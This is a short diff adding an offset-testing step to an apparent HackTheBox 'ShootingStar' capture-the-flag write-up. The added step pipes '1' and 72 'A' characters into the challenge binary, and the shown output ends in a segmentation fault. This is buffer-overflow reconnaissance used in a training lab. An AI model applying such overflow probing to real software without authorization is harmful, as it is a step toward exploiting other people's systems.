@@ -221,6 +221,18 @@ gdb-peda$
 
 ```
 
+Run python offset: 
+```shell
+ (e) Files  …  hackthebox  ShootingStar  Files  python -c "print ('1\n' + 'A' * 72)"|./shooting_star                                                           0  26   main 
+🌠 A shooting star!!
+1. Make a wish!
+2. Stare at the stars.
+3. Learn about the stars.
+> >> 
+May your wish come true!
+Segmentation fault (core dumped)
+ (e) Files  …  hackthebox  ShootingStar  Files        
+```
 
 CHALLENGE DESCRIPTION
 
